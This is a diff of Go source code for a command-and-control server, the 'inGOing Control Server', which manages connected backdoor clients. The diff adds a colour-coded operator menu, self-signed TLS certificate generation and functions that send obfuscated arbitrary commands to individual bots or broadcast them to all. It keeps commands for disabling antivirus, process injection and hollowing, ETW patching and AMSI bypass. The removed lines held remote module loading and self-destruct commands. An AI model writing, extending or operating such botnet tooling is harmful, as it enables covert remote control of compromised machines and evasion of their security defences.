@@ -10,6 +10,8 @@ import (
 	"io"
 	"net"
 	"os"
+	"os/exec"
+	"runtime"
 	"strings"
 	"sync"
 	"time"
@@ -30,6 +32,32 @@ const (
 	CMD_PATCH_ETW      = "patch_etw"       // Command to patch ETW
 	CMD_BYPASS_AMSI    = "bypass_amsi"     // Command to bypass AMSI
 )
+
+// Color constants based on OS
+var (
+	colorReset  = ""
+	colorRed    = ""
+	colorGreen  = ""
+	colorYellow = ""
+	colorBlue   = ""
+	colorPurple = ""
+	colorCyan   = ""
+	colorWhite  = ""
+	isWindows   = runtime.GOOS == "windows"
+)
+
+func init() {
+	if !isWindows {
+		colorReset  = "\033[0m"
+		colorRed    = "\033[31m"
+		colorGreen  = "\033[32m"
+		colorYellow = "\033[33m"
+		colorBlue   = "\033[34m"
+		colorPurple = "\033[35m"
+		colorCyan   = "\033[36m"
+		colorWhite  = "\033[37m"
+	}
+}
 
 // Structure for storing client information
 type Backdoor struct {
@@ -286,181 +314,535 @@ func monitorBackdoors() {
 	}
 }
 
-// Display interactive menu
+// Menu structure
+type MenuItem struct {
+	id          string
+	name        string
+	description string
+	handler     func()
+	category    string
+}
+
+// Menu categories
+var menuCategories = []string{
+	"Clients",
+	"Commands",
+	"Debug",
+	"System",
+	"Help",
+}
+
+// Menu items
+var menuItems []MenuItem
+
+// Initialize menu items
+func initializeMenu() {
+	menuItems = []MenuItem{
+		// Clients category
+		{
+			id:          "1",
+			name:        "List Clients",
+			description: "Show all connected clients",
+			handler:     listClients,
+			category:    "Clients",
+		},
+		{
+			id:          "2",
+			name:        "Client Details",
+			description: "Show detailed information about a specific client",
+			handler:     showClientDetails,
+			category:    "Clients",
+		},
+		
+		// Commands category
+		{
+			id:          "3",
+			name:        "Send Command",
+			description: "Send command to a specific client",
+			handler:     sendCommand,
+			category:    "Commands",
+		},
+		{
+			id:          "4",
+			name:        "Broadcast",
+			description: "Send command to all clients",
+			handler:     broadcastCommand,
+			category:    "Commands",
+		},
+		
+		// Debug category
+		{
+			id:          "5",
+			name:        "Debug Clients",
+			description: "List all debug mode clients",
+			handler:     listDebugClients,
+			category:    "Debug",
+		},
+		{
+			id:          "6",
+			name:        "Debug Logs",
+			description: "View debug session logs",
+			handler:     viewDebugLogs,
+			category:    "Debug",
+		},
+		
+		// System category
+		{
+			id:          "7",
+			name:        "Server Status",
+			description: "Show server status and statistics",
+			handler:     showServerStatus,
+			category:    "System",
+		},
+		{
+			id:          "8",
+			name:        "Update Settings",
+			description: "Configure update server settings",
+			handler:     updateSettings,
+			category:    "System",
+		},
+		
+		// Help category
+		{
+			id:          "9",
+			name:        "Help",
+			description: "Show help information",
+			handler:     showHelp,
+			category:    "Help",
+		},
+		{
+			id:          "0",
+			name:        "Exit",
+			description: "Exit the server",
+			handler:     exitServer,
+			category:    "Help",
+		},
+	}
+}
+
+// Format text for output
+func formatText(text string, color string) string {
+	if isWindows {
+		return text
+	}
+	return color + text + colorReset
+}
+
+// Show main menu
 func showMenu() {
-	fmt.Println("\nClient Management Menu:")
-	fmt.Println("1. List active clients")
-	fmt.Println("2. Send command to client")
-	fmt.Println("3. Load module to client")
-	fmt.Println("4. Update clients")
-	fmt.Println("5. Remove client")
-	fmt.Println("6. Client information")
-	fmt.Println("7. Broadcast command")
-	fmt.Println("8. Antivirus management")
-	fmt.Println("9. Debug clients")
-	fmt.Println("10. Exit")
-}
-
-// Display detailed client information
-func showBackdoorInfo(id string) {
-	mutex.Lock()
-	defer mutex.Unlock()
-
-	if backdoor, ok := activeBots[id]; ok {
-		fmt.Printf("\nClient information %s:\n", id)
-		fmt.Printf("Operating System: %s\n", backdoor.OS)
-		fmt.Printf("Privileges: %s\n", backdoor.Privileges)
-		fmt.Printf("Version: %s\n", backdoor.Version)
-		fmt.Printf("Last seen: %s\n", backdoor.LastSeen.Format("2006-01-02 15:04:05"))
-	} else {
-		fmt.Println("Client not found!")
-	}
-}
-
-// Broadcast command to all connected clients
-func broadcastCommand(command string) {
-	mutex.Lock()
-	defer mutex.Unlock()
-
-	for id, backdoor := range activeBots {
-		fmt.Printf("Sending command to client %s...\n", id)
-		backdoor.Conn.SetDeadline(time.Now().Add(Timeout))
-		backdoor.Conn.Write([]byte(obfuscate(command + "\n")))
-	}
-}
-
-// Handle antivirus management operations
-func handleAVManagement(backdoor *Backdoor) {
-	fmt.Println("\nAntivirus Management:")
-	fmt.Println("1. Disable antivirus")
-	fmt.Println("2. Advanced bypass")
-	fmt.Println("3. Process injection")
-	fmt.Println("4. Process hollowing")
-	fmt.Println("5. Patch ETW")
-	fmt.Println("6. Bypass AMSI")
-	fmt.Println("7. Back")
-
-	var choice int
-	fmt.Print("Select action: ")
-	fmt.Scan(&choice)
-
-	switch choice {
-	case 1:
-		handleCommand(backdoor, CMD_DISABLE_AV)
-	case 2:
-		handleCommand(backdoor, CMD_BYPASS_AV)
-	case 3:
-		handleCommand(backdoor, CMD_INJECT_PROCESS)
-	case 4:
-		handleCommand(backdoor, CMD_HOLLOW_PROCESS)
-	case 5:
-		handleCommand(backdoor, CMD_PATCH_ETW)
-	case 6:
-		handleCommand(backdoor, CMD_BYPASS_AMSI)
-	}
-}
-
-// Handle debug clients menu
-func handleDebugMenu() {
-	fmt.Println("\nDebug Clients Menu:")
-	fmt.Println("1. List debug clients")
-	fmt.Println("2. Send command to debug client")
-	fmt.Println("3. Debug client information")
-	fmt.Println("4. Back to main menu")
-	
-	var choice int
-	fmt.Print("Select action: ")
-	fmt.Scan(&choice)
-	
-	switch choice {
-	case 1:
-		// List debug clients
-		fmt.Println("\nActive debug clients:")
+	for {
+		clearScreen()
+		printBanner()
+		
+		// Show active clients count
 		mutex.Lock()
-		for id, backdoor := range activeBots {
-			if backdoor.IsDebug {
-				fmt.Printf("[%s] OS: %s/%s, Privileges: %s, Version: %s (DEBUG)\n",
-					id, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.Version)
+		activeCount := len(activeBots)
+		debugCount := countDebugClients()
+		mutex.Unlock()
+		
+		fmt.Printf("\n%s\n", formatText(fmt.Sprintf("Active Clients: %d | Debug Clients: %d", 
+			activeCount, debugCount), colorGreen))
+		
+		// Print menu by categories
+		for _, category := range menuCategories {
+			fmt.Printf("%s\n", formatText(fmt.Sprintf("=== %s ===", category), colorYellow))
+			for _, item := range menuItems {
+				if item.category == category {
+					fmt.Printf("%s %s - %s\n",
+						formatText(fmt.Sprintf("[%s]", item.id), colorCyan),
+						item.name, item.description)
+				}
+			}
+			if category != "Help" {
+				fmt.Println()
 			}
 		}
-		mutex.Unlock()
 		
-	case 2:
-		// Send command to debug client
-		fmt.Print("Enter client ID: ")
-		scanner := bufio.NewScanner(os.Stdin)
-		scanner.Scan()
-		botID := strings.TrimSpace(scanner.Text())
+		// Get user input
+		fmt.Printf("\n%s ", formatText("Select an option:", colorGreen))
+		var choice string
+		fmt.Scanln(&choice)
 		
-		fmt.Print("Enter command: ")
-		scanner.Scan()
-		command := strings.TrimSpace(scanner.Text())
-		
-		mutex.Lock()
-		if backdoor, ok := activeBots[botID]; ok && backdoor.IsDebug {
-			handleCommand(backdoor, command)
-		} else {
-			fmt.Println("Debug client not found!")
+		// Handle choice
+		for _, item := range menuItems {
+			if item.id == choice {
+				item.handler()
+				break
+			}
 		}
-		mutex.Unlock()
-		
-	case 3:
-		// Show debug client information
-		fmt.Print("Enter client ID: ")
-		scanner := bufio.NewScanner(os.Stdin)
-		scanner.Scan()
-		botID := strings.TrimSpace(scanner.Text())
-		
-		mutex.Lock()
-		if backdoor, ok := activeBots[botID]; ok && backdoor.IsDebug {
-			fmt.Printf("\nDebug Client Information %s:\n", botID)
-			fmt.Printf("Operating System: %s\n", backdoor.OS)
-			fmt.Printf("Architecture: %s\n", backdoor.Arch)
-			fmt.Printf("Privileges: %s\n", backdoor.Privileges)
-			fmt.Printf("Version: %s\n", backdoor.Version)
-			fmt.Printf("Last seen: %s\n", backdoor.LastSeen.Format("2006-01-02 15:04:05"))
-			fmt.Printf("Antivirus: %s\n", backdoor.AVStatus)
-		} else {
-			fmt.Println("Debug client not found!")
-		}
-		mutex.Unlock()
 	}
+}
+
+// Clear screen
+func clearScreen() {
+	if isWindows {
+		cmd := exec.Command("cmd", "/c", "cls")
+		cmd.Stdout = os.Stdout
+		cmd.Run()
+	} else {
+		fmt.Print("\033[H\033[2J")
+	}
+}
+
+// Print banner
+func printBanner() {
+	banner := `
+██╗███╗   ██╗ ██████╗  ██████╗ ██╗███╗   ██╗ ██████╗ 
+██║████╗  ██║██╔════╝ ██╔═══██╗██║████╗  ██║██╔════╝ 
+██║██╔██╗ ██║██║  ███╗██║   ██║██║██╔██╗ ██║██║  ███╗
+██║██║╚██╗██║██║   ██║██║   ██║██║██║╚██╗██║██║   ██║
+██║██║ ╚████║╚██████╔╝╚██████╔╝██║██║ ╚████║╚██████╔╝
+╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+                                      Control Server v1.0
+`
+	fmt.Print(formatText(banner, colorCyan))
+}
+
+// Count debug clients
+func countDebugClients() int {
+	count := 0
+	for _, bot := range activeBots {
+		if bot.IsDebug {
+			count++
+		}
+	}
+	return count
+}
+
+// Menu handlers
+func listClients() {
+	clearScreen()
+	fmt.Printf("%s\n\n", formatText("=== Connected Clients ===", colorYellow))
+	
+	mutex.Lock()
+	defer mutex.Unlock()
+	
+	if len(activeBots) == 0 {
+		fmt.Printf("%s\n", formatText("No clients connected", colorRed))
+	} else {
+		for id, bot := range activeBots {
+			fmt.Printf("%s\n", formatText(fmt.Sprintf("[%s]", id), colorCyan))
+			fmt.Printf("  OS: %s/%s\n", bot.OS, bot.Arch)
+			fmt.Printf("  Privileges: %s (Admin: %v, UAC: %v)\n", 
+				bot.Privileges, bot.IsAdmin, bot.HasUAC)
+			fmt.Printf("  Version: %s\n", bot.Version)
+			fmt.Printf("  Last Seen: %s\n", bot.LastSeen.Format("2006-01-02 15:04:05"))
+			fmt.Printf("  Debug Mode: %v\n\n", bot.IsDebug)
+		}
+	}
+	
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func showClientDetails() {
+	clearScreen()
+	fmt.Printf("%s=== Client Details ===%s\n\n", colorYellow, colorReset)
+	
+	fmt.Printf("Enter client ID: ")
+	var id string
+	fmt.Scanln(&id)
+	
+	mutex.Lock()
+	bot, exists := activeBots[id]
+	mutex.Unlock()
+	
+	if !exists {
+		fmt.Printf("%sClient not found%s\n", colorRed, colorReset)
+	} else {
+		fmt.Printf("%sClient Information:%s\n", colorGreen, colorReset)
+		fmt.Printf("  ID: %s\n", bot.ID)
+		fmt.Printf("  OS: %s/%s\n", bot.OS, bot.Arch)
+		fmt.Printf("  Privileges: %s\n", bot.Privileges)
+		fmt.Printf("  Admin: %v\n", bot.IsAdmin)
+		fmt.Printf("  UAC: %v\n", bot.HasUAC)
+		fmt.Printf("  Can Elevate: %v\n", bot.CanElevate)
+		fmt.Printf("  Version: %s\n", bot.Version)
+		fmt.Printf("  Last Seen: %s\n", bot.LastSeen.Format("2006-01-02 15:04:05"))
+		fmt.Printf("  Debug Mode: %v\n", bot.IsDebug)
+		fmt.Printf("  AV Status: %s\n", bot.AVStatus)
+		fmt.Printf("  Protection: %v\n", bot.Protection)
+	}
+	
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func sendCommand() {
+	clearScreen()
+	fmt.Printf("%s=== Send Command ===%s\n\n", colorYellow, colorReset)
+	
+	fmt.Printf("Enter client ID (or 'all' for broadcast): ")
+	var id string
+	fmt.Scanln(&id)
+	
+	fmt.Printf("Enter command: ")
+	command, _ := bufio.NewReader(os.Stdin).ReadString('\n')
+	command = strings.TrimSpace(command)
+	
+	mutex.Lock()
+	defer mutex.Unlock()
+	
+	if id == "all" {
+		for _, bot := range activeBots {
+			bot.Conn.Write([]byte(obfuscate(command + "\n")))
+		}
+		fmt.Printf("%sCommand broadcast to all clients%s\n", colorGreen, colorReset)
+	} else {
+		if bot, exists := activeBots[id]; exists {
+			bot.Conn.Write([]byte(obfuscate(command + "\n")))
+			fmt.Printf("%sCommand sent to client %s%s\n", colorGreen, id, colorReset)
+		} else {
+			fmt.Printf("%sClient not found%s\n", colorRed, colorReset)
+		}
+	}
+	
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func broadcastCommand() {
+	clearScreen()
+	fmt.Printf("%s=== Broadcast Command ===%s\n\n", colorYellow, colorReset)
+	
+	fmt.Printf("Enter command to broadcast: ")
+	command, _ := bufio.NewReader(os.Stdin).ReadString('\n')
+	command = strings.TrimSpace(command)
+	
+	mutex.Lock()
+	for _, bot := range activeBots {
+		bot.Conn.Write([]byte(obfuscate(command + "\n")))
+	}
+	mutex.Unlock()
+	
+	fmt.Printf("%sCommand broadcast to all clients%s\n", colorGreen, colorReset)
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func listDebugClients() {
+	clearScreen()
+	fmt.Printf("%s=== Debug Clients ===%s\n\n", colorYellow, colorReset)
+	
+	mutex.Lock()
+	defer mutex.Unlock()
+	
+	debugFound := false
+	for id, bot := range activeBots {
+		if bot.IsDebug {
+			debugFound = true
+			fmt.Printf("%s[DEBUG] Client: %s%s\n", colorCyan, id, colorReset)
+			fmt.Printf("  OS: %s/%s\n", bot.OS, bot.Arch)
+			fmt.Printf("  Privileges: %s\n", bot.Privileges)
+			fmt.Printf("  Last Seen: %s\n\n", bot.LastSeen.Format("2006-01-02 15:04:05"))
+		}
+	}
+	
+	if !debugFound {
+		fmt.Printf("%sNo debug clients connected%s\n", colorRed, colorReset)
+	}
+	
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func viewDebugLogs() {
+	clearScreen()
+	fmt.Printf("%s=== Debug Logs ===%s\n\n", colorYellow, colorReset)
+	
+	fmt.Printf("Enter client ID: ")
+	var id string
+	fmt.Scanln(&id)
+	
+	mutex.Lock()
+	bot, exists := activeBots[id]
+	mutex.Unlock()
+	
+	if !exists || !bot.IsDebug {
+		fmt.Printf("%sDebug client not found%s\n", colorRed, colorReset)
+	} else {
+		fmt.Printf("%sDebug logs for client %s:%s\n\n", colorGreen, id, colorReset)
+		// Here you would implement debug log viewing logic
+	}
+	
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func showServerStatus() {
+	clearScreen()
+	fmt.Printf("%s=== Server Status ===%s\n\n", colorYellow, colorReset)
+	
+	mutex.Lock()
+	totalClients := len(activeBots)
+	debugClients := countDebugClients()
+	mutex.Unlock()
+	
+	fmt.Printf("Server Version: %s\n", currentVersion)
+	fmt.Printf("Active Clients: %d\n", totalClients)
+	fmt.Printf("Debug Clients: %d\n", debugClients)
+	fmt.Printf("Binary Checksum: %s\n", binaryChecksum)
+	fmt.Printf("Update URL: %s\n", updateURL)
+	
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func updateSettings() {
+	clearScreen()
+	fmt.Printf("%s=== Update Settings ===%s\n\n", colorYellow, colorReset)
+	
+	fmt.Printf("Current Settings:\n")
+	fmt.Printf("1. Version: %s\n", currentVersion)
+	fmt.Printf("2. Update URL: %s\n", updateURL)
+	fmt.Printf("3. Binary Checksum: %s\n\n", binaryChecksum)
+	
+	fmt.Printf("Select setting to change (1-3): ")
+	var choice string
+	fmt.Scanln(&choice)
+	
+	switch choice {
+	case "1":
+		fmt.Printf("Enter new version: ")
+		fmt.Scanln(&currentVersion)
+	case "2":
+		fmt.Printf("Enter new update URL: ")
+		fmt.Scanln(&updateURL)
+	case "3":
+		fmt.Printf("Enter new binary checksum: ")
+		fmt.Scanln(&binaryChecksum)
+	default:
+		fmt.Printf("%sInvalid choice%s\n", colorRed, colorReset)
+	}
+	
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func showHelp() {
+	clearScreen()
+	fmt.Printf("%s=== Help Information ===%s\n\n", colorYellow, colorReset)
+	
+	fmt.Printf("Available Commands:\n\n")
+	for _, category := range menuCategories {
+		fmt.Printf("%s=== %s ===%s\n", colorCyan, category, colorReset)
+		for _, item := range menuItems {
+			if item.category == category {
+				fmt.Printf("%s[%s]%s %s - %s\n",
+					colorGreen, item.id, colorReset,
+					item.name, item.description)
+			}
+		}
+		fmt.Println()
+	}
+	
+	fmt.Printf("\nPress Enter to continue...")
+	bufio.NewReader(os.Stdin).ReadBytes('\n')
+}
+
+func exitServer() {
+	clearScreen()
+	fmt.Printf("%s=== Exiting Server ===%s\n\n", colorYellow, colorReset)
+	
+	fmt.Printf("Are you sure you want to exit? (y/n): ")
+	var choice string
+	fmt.Scanln(&choice)
+	
+	if strings.ToLower(choice) == "y" {
+		fmt.Printf("%sShutting down server...%s\n", colorRed, colorReset)
+		os.Exit(0)
+	}
+}
+
+// Generate self-signed certificates
+func generateCertificates() error {
+	fmt.Printf("%s[*] Generating self-signed certificates...%s\n", colorYellow, colorReset)
+	
+	// Generate private key
+	cmd := exec.Command("openssl", "req", "-x509", "-newkey", "rsa:4096", 
+		"-keyout", KeyFile, 
+		"-out", CertFile, 
+		"-days", "365", 
+		"-nodes",
+		"-subj", "/CN=localhost")
+	
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("failed to generate certificates: %v\nOutput: %s", err, string(output))
+	}
+	
+	fmt.Printf("%s[+] Certificates generated successfully%s\n", colorGreen, colorReset)
+	return nil
 }
 
 // Main server function
 func main() {
+	var err error
+	
+	// Initialize menu
+	initializeMenu()
+	
+	// Print startup banner
+	clearScreen()
+	printBanner()
+	fmt.Printf("%s[*] Starting inGOing Control Server...%s\n", colorGreen, colorReset)
+
+	// Check and generate certificates if needed
+	if _, err = os.Stat(CertFile); os.IsNotExist(err) {
+		if _, err = os.Stat(KeyFile); os.IsNotExist(err) {
+			fmt.Printf("%s[!] Certificate files not found, generating new ones...%s\n", colorYellow, colorReset)
+			if err = generateCertificates(); err != nil {
+				fmt.Printf("%s[!] Error generating certificates: %v%s\n", colorRed, err, colorReset)
+				fmt.Printf("\nPress Enter to exit...")
+				bufio.NewReader(os.Stdin).ReadBytes('\n')
+				return
+			}
+		}
+	}
+	fmt.Printf("%s[+] Certificate files found%s\n", colorGreen, colorReset)
+
 	// Initialize TLS configuration
+	fmt.Printf("%s[*] Initializing TLS configuration...%s\n", colorYellow, colorReset)
 	tlsConfig, err := setupTLS()
 	if err != nil {
-		fmt.Println("Error setting up TLS:", err)
+		fmt.Printf("%s[!] Error setting up TLS: %v%s\n", colorRed, err, colorReset)
+		fmt.Printf("\nPress Enter to exit...")
+		bufio.NewReader(os.Stdin).ReadBytes('\n')
 		return
 	}
+	fmt.Printf("%s[+] TLS configuration initialized%s\n", colorGreen, colorReset)
 
 	// Start TLS server
+	fmt.Printf("%s[*] Starting server on port %s...%s\n", colorYellow, ServerPort, colorReset)
 	listener, err := tls.Listen("tcp", ":"+ServerPort, tlsConfig)
 	if err != nil {
-		fmt.Println("Error starting server:", err)
+		fmt.Printf("%s[!] Error starting server: %v%s\n", colorRed, err, colorReset)
+		fmt.Printf("\nPress Enter to exit...")
+		bufio.NewReader(os.Stdin).ReadBytes('\n')
 		return
 	}
 	defer listener.Close()
-	
-	fmt.Println("Server started on port", ServerPort, "with TLS")
+	fmt.Printf("%s[+] Server started successfully%s\n", colorGreen, colorReset)
 
 	// Start client monitoring
+	fmt.Printf("%s[*] Starting client monitor...%s\n", colorYellow, colorReset)
 	go monitorBackdoors()
+	fmt.Printf("%s[+] Client monitor started%s\n", colorGreen, colorReset)
 
 	// Handle incoming connections
+	fmt.Printf("%s[*] Starting connection handler...%s\n", colorYellow, colorReset)
 	go func() {
 		for {
 			conn, err := listener.Accept()
 			if err != nil {
-				fmt.Println("Connection error:", err)
+				fmt.Printf("%s[!] Connection error: %v%s\n", colorRed, err, colorReset)
 				continue
 			}
 
 			// Validate incoming connection
 			if !validateConnection(conn) {
-				fmt.Printf("Suspicious connection from %s\n", conn.RemoteAddr())
+				fmt.Printf("%s[!] Suspicious connection from %s rejected%s\n", 
+					colorRed, conn.RemoteAddr(), colorReset)
 				conn.Close()
 				continue
 			}
@@ -468,131 +850,12 @@ func main() {
 			go handleConnection(conn)
 		}
 	}()
+	fmt.Printf("%s[+] Connection handler started%s\n", colorGreen, colorReset)
 
-	// Main menu loop
-	for {
-		showMenu()
-		var choice int
-		fmt.Print("Select action: ")
-		fmt.Scan(&choice)
+	// Small delay to show startup messages
+	time.Sleep(1 * time.Second)
 
-		switch choice {
-		case 1:
-			// List active clients
-			fmt.Println("\nActive clients:")
-			mutex.Lock()
-			for id, backdoor := range activeBots {
-				fmt.Printf("[%s] OS: %s/%s, Privileges: %s, Version: %s\n",
-					id, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.Version)
-			}
-			mutex.Unlock()
-
-		case 2:
-			// Send command to specific client
-			fmt.Print("Enter client ID: ")
-			scanner := bufio.NewScanner(os.Stdin)
-			scanner.Scan()
-			botID := strings.TrimSpace(scanner.Text())
-			
-			fmt.Print("Enter command: ")
-			scanner.Scan()
-			command := strings.TrimSpace(scanner.Text())
-			
-			mutex.Lock()
-			if backdoor, ok := activeBots[botID]; ok {
-				handleCommand(backdoor, command)
-			} else {
-				fmt.Println("Client not found!")
-			}
-			mutex.Unlock()
-
-		case 3:
-			// Load module to client
-			fmt.Print("Enter client ID: ")
-			scanner := bufio.NewScanner(os.Stdin)
-			scanner.Scan()
-			botID := strings.TrimSpace(scanner.Text())
-			
-			fmt.Print("Enter module URL: ")
-			scanner.Scan()
-			moduleURL := strings.TrimSpace(scanner.Text())
-			
-			mutex.Lock()
-			if backdoor, ok := activeBots[botID]; ok {
-				handleCommand(backdoor, "load_module:"+moduleURL)
-			} else {
-				fmt.Println("Client not found!")
-			}
-			mutex.Unlock()
-
-		case 4:
-			// Update clients
-			fmt.Print("Enter new version: ")
-			scanner := bufio.NewScanner(os.Stdin)
-			scanner.Scan()
-			newVersion := strings.TrimSpace(scanner.Text())
-			
-			currentVersion = newVersion
-			fmt.Println("Version updated. Clients will update on next check.")
-
-		case 5:
-			// Remove client
-			fmt.Print("Enter client ID: ")
-			scanner := bufio.NewScanner(os.Stdin)
-			scanner.Scan()
-			botID := strings.TrimSpace(scanner.Text())
-			
-			mutex.Lock()
-			if backdoor, ok := activeBots[botID]; ok {
-				handleCommand(backdoor, "self_destruct")
-				delete(activeBots, botID)
-			} else {
-				fmt.Println("Client not found!")
-			}
-			mutex.Unlock()
-
-		case 6:
-			// Show client information
-			fmt.Print("Enter client ID: ")
-			scanner := bufio.NewScanner(os.Stdin)
-			scanner.Scan()
-			botID := strings.TrimSpace(scanner.Text())
-			showBackdoorInfo(botID)
-
-		case 7:
-			// Broadcast command
-			fmt.Print("Enter command for all clients: ")
-			scanner := bufio.NewScanner(os.Stdin)
-			scanner.Scan()
-			command := strings.TrimSpace(scanner.Text())
-			broadcastCommand(command)
-
-		case 8:
-			// Antivirus management
-			fmt.Print("Enter client ID: ")
-			scanner := bufio.NewScanner(os.Stdin)
-			scanner.Scan()
-			botID := strings.TrimSpace(scanner.Text())
-			
-			mutex.Lock()
-			if backdoor, ok := activeBots[botID]; ok {
-				handleAVManagement(backdoor)
-			} else {
-				fmt.Println("Client not found!")
-			}
-			mutex.Unlock()
-
-		case 9:
-			// Debug clients menu
-			handleDebugMenu()
-
-		case 10:
-			// Exit program
-			fmt.Println("Exiting...")
-			return
-
-		default:
-			fmt.Println("Invalid choice!")
-		}
-	}
+	// Start menu
+	fmt.Printf("%s[*] Initializing control menu...%s\n", colorYellow, colorReset)
+	showMenu()
 }
